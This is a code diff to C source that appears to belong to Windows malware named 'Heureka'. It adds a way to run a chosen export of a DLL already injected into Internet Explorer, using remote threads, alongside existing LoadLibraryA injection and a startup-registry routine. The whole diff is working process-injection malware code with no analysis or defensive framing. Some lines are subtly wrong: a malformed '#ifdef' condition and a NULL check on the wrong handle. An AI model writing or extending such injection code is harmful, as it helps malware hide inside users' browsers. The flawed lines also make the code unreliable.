@@ -378,6 +378,26 @@ void set_startup_registry(){
 #endif
 
 #if DLL_INJECT_IE==1
+
+#ifdef DLL_INJECT_IE_CALL
+void* GetPayloadExportAddr( LPCSTR lpPath, HMODULE hPayloadBase, LPCSTR lpFunctionName ) {
+  HMODULE hLoaded = LoadLibrary( lpPath );
+
+  if( hLoaded == NULL ) {
+	DWORD x=GetLastError();
+	return NULL;
+  } else {
+    void* lpFunc   = GetProcAddress( hLoaded, lpFunctionName );
+    DWORD dwOffset = (char*)lpFunc - (char*)hLoaded;
+
+    FreeLibrary( hLoaded );
+	DWORD sum=(DWORD)hPayloadBase + dwOffset;
+    char* ret=(char*)sum;
+	return ret;
+  }
+}
+#endif
+
 void dll_inject_ie(){
 	STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -452,11 +472,24 @@ void dll_inject_ie(){
 	WriteProcessMemory(hP, pLibRemote, (void*)HEUREKADLL_PATH,sizeof(HEUREKADLL_PATH), NULL );
 	
 	HANDLE hThread=CreateRemoteThread( hP, NULL, 0,(LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32,"LoadLibraryA" ),pLibRemote, 0, NULL );
+
 	print_status("Remote Thread: %p", hThread);
-	MessageBox(NULL, TEXT("Heureka inject"),TEXT("Heureka"),MB_OK);
 	WaitForSingleObject( hThread, INFINITE );
-	CloseHandle(hThread);
-	
+
+#ifdef DLL_INJECT_IE_CALL!=NULL
+	HMODULE hInjected;
+	GetExitCodeThread( hThread, ( LPDWORD )&hInjected );
+	void* lpInit = GetPayloadExportAddr( (LPCSTR)HEUREKADLL_PATH, hInjected, DLL_INJECT_IE_CALL );
+	if( lpInit != NULL ){
+		HANDLE hThread2 = CreateRemoteThread( hP, NULL, 0, (LPTHREAD_START_ROUTINE)lpInit, NULL, 0, NULL );
+
+		if( hThread != NULL ) {
+			CloseHandle( hThread2 );
+		}
+	}
+#endif
+
+	CloseHandle(hThread);	
 	WaitForSingleObject(hP, INFINITE );
 	CloseHandle(hP);
 	//CloseHandle(pi.hThread);
